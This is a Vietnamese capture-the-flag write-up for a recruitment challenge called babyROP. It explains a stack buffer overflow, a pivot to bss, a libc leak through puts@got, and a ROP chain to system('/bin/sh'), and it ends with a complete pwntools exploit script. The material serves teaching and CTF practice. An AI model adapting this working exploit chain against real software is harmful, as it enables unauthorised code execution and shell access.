Hướng dẫn cách giải bài babyROP của giải KCSC-Recruitment-2025

**Author:** Nguyễn Cao Nhân aka Nhân Sigma

**Category:** Binary Exploitation

**Date:** 28/09/2026

## 1. Mục tiêu
Đầu tiên là xem checksec và đọc code

<img width="360" height="202" alt="image" src="https://github.com/user-attachments/assets/d3f85e57-f9e8-435c-97e1-bf2dd570cc78" />

```C
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[64]; // [rsp+0h] [rbp-40h] BYREF

  setup(argc, argv, envp);
  puts("Welcome to KCSC Recruitment !!!");
  printf("Data: ");
  fgets(s, 4919, stdin);      // BOF
  if ( strlen(s) > 0x40 )
  {
    puts("Buffer overflow ??? No way.");
    exit(0);
  }
  puts("Thank for playing :)");
  return 0;
}
```

Bài này nhìn vô là thấy **Buffer OverFlow**, nhưng điều quan trọng nhất là làm sao leak được libc. Nhiều bạn sẽ nghĩ là xài `pop rdi` của file là xong. Thế thì quá đơn giản rồi, nhưng bài này không có. Vậy thì chỉ còn 1 cách duy nhất thôi.

<img width="707" height="47" alt="image" src="https://github.com/user-attachments/assets/cc3926e1-a03a-41b9-acc5-ce0226f7deb4" />

Mình sẽ thay đổi thanh ghi `rax`, ghi nó giá trị `puts@got` và gọi `puts` của thằng main. Nhưng có 1 vấn đề quan trọng là `pop rax` trong bài nó không có clean.

<img width="1001" height="300" alt="image" src="https://github.com/user-attachments/assets/65ad8cf5-09b4-4219-8828-d656a7b6a770" />

Nó sẽ nhảy vào thực thi `__do_global_dtors_aux+21`, sau đó cộng vào `eax` 0x2ecb byte, sau đó mới ret ra. Vậy thì chỉ cần set `rax` là `puts@got - 0x2ecb` là xong. Và việc còn lại là thực thi `system` thôi. Ok bắt tay vô làm nào !

## 2. Cách thực thi
Đầu tiên là ta phải chuyển hộ khẩu `stack` sang vùng `bss` để vừa kiểm soát vị trí ghi vừa rộng rãi cho thoải mái.

```Python
pop_rax = 0x0000000000401148
put = 0x04012BE 
fgets = 0x0401260  
real_fgets = 0x0401274    
bss = 0x4046c0
leave_ret = 0x04012CB

payload = b'\x00' + b'A' * 63
payload += p64(bss)
payload += p64(fgets)

pause()

p.sendlineafter(b'Data: ', payload)
```

Sau khi chuyển hộ khẩu, ta sẽ bắt đầu ghi 1 chuỗi payload dài, phải tính toán chi tiết cẩn thận vì nó sẽ thực hiện 2 payload cùng 1 lúc.

```Python
payload = b'\x00' + b'A' * 63
payload += p64(bss + 0x70)
payload += p64(pop_rax)
payload += p64(exe.got['puts'] - 0x2ecb)
payload += p64(put)

payload = payload.ljust(176, b'\x00')

payload += p64(bss + 0x70)
payload += p64(real_fgets)
```

Đầu tiên là leak libc

<img width="1771" height="340" alt="image" src="https://github.com/user-attachments/assets/a7c6b865-a82f-4223-957a-7c0e3224d2ea" />

Sau khi leak được libc thì nó sẽ không dừng lại mà thực thi tiếp lệnh thứ 2 của ta. Đó là tìm 1 vùng `bss` để ghi payload `system(/bin/sh)` vào.

<img width="1135" height="512" alt="image" src="https://github.com/user-attachments/assets/f1bbc347-050e-4d1d-bf2a-93113367c912" />

Sau khi tạo 1 vùng để ghi vào, ta sẽ ghi payload thực thi `system(/bin/sh)`.

```Python
p.recvline()
leak_libc = u64(p.recv(6) + b'\x00\x00')
log.success(f'Leak Libc : {hex(leak_libc)}')
libc.address = leak_libc - libc.symbols['puts']
log.success(f'Libc base : {hex(libc.address)}')

payload = b'\x00' + b'A' * 15
payload += p64(0xdeadbeef)
payload += p64(libc.address + 0x2a3e5)
payload += p64(next(libc.search(b'/bin/sh')))
payload += p64(libc.address + 0x29139)
payload += p64(libc.symbols['system'])

p.sendline(payload)
```

Bởi vì `fget()` mình xài không nằm trước lệnh `puts(Data: )` nên sẽ gửi thẳng luôn. Khúc này nhiều bạn sẽ thắc mắc là tại sao phải là 24 byte mới tới `RIP` mà không phải 80 byte.

<img width="775" height="143" alt="image" src="https://github.com/user-attachments/assets/9a54a714-ae9b-448b-9ddc-e01d6970df1a" />

Mình ghi vào địa chỉ `0x4046f0`. Lúc này tại `_IO_getline_info+220` nó sẽ thực hiện các lệnh sau

<img width="1278" height="300" alt="image" src="https://github.com/user-attachments/assets/8d3c62fc-dc1b-481c-b09e-971f874c564c" />

Nó thực hiện tổng cộng 4 lệnh `pop` tức là 24 byte. Sau đó sẽ ret tức là vừa khít ngay lệnh `pop rdi` của mình. Vậy là ok rồi. Bài này cũng khá là khó, mình đã nhờ đại ca **Saitomu** gợi ý và đã solve ra.

## 3. Exploit
```Python
from pwn import *

exe = ELF('chall_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

p = process('./chall_patched')

pop_rax = 0x0000000000401148
put = 0x04012BE 
fgets = 0x0401260  
real_fgets = 0x0401274    
bss = 0x4046c0
leave_ret = 0x04012CB

payload = b'\x00' + b'A' * 63
payload += p64(bss)
payload += p64(fgets)

pause()

p.sendlineafter(b'Data: ', payload)

payload = b'\x00' + b'A' * 63
payload += p64(bss + 0x70)
payload += p64(pop_rax)
payload += p64(exe.got['puts'] - 0x2ecb)
payload += p64(put)

payload = payload.ljust(176, b'\x00')

payload += p64(bss + 0x70)
payload += p64(real_fgets)

p.sendlineafter(b'Data: ', payload)

p.recvline()
leak_libc = u64(p.recv(6) + b'\x00\x00')
log.success(f'Leak Libc : {hex(leak_libc)}')
libc.address = leak_libc - libc.symbols['puts']
log.success(f'Libc base : {hex(libc.address)}')

payload = b'\x00' + b'A' * 15
payload += p64(0xdeadbeef)
payload += p64(libc.address + 0x2a3e5)
payload += p64(next(libc.search(b'/bin/sh')))
payload += p64(libc.address + 0x29139)
payload += p64(libc.symbols['system'])

p.sendline(payload)

p.interactive()
```
